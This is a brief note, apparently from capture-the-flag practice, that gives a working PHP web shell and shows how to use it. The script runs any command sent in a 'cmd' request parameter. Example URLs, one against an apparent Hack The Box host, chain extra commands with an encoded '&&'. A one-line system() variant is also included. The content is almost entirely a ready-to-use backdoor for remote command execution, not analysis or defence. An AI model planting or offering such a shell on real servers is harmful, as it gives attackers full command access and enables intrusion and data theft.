Usage:http://www.example.com/shell.php?cmd=ls


<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    echo "</pre>$cmd<pre>";
    die;
}
?>

Example of command
http://bank.htb/uploads/cmd.htb?cmd=ls%26%26id
where %26 is an & url encoded

or 


<?php system(''ls''); ?>

